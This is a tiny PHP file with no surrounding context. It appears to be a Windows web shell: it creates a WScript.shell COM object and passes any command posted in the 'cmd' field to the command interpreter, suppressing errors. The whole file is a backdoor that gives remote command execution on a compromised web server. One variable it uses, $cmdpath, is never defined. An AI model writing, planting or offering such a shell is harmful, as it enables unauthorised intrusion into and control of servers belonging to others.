<?php
$shell = new COM("WScript.shell");
if(!empty($_POST['cmd'])) { 
	$cmd = $_POST['cmd'];
	$exe = @$shell->exec("$cmdpath /c ".$cmd); 
}
?>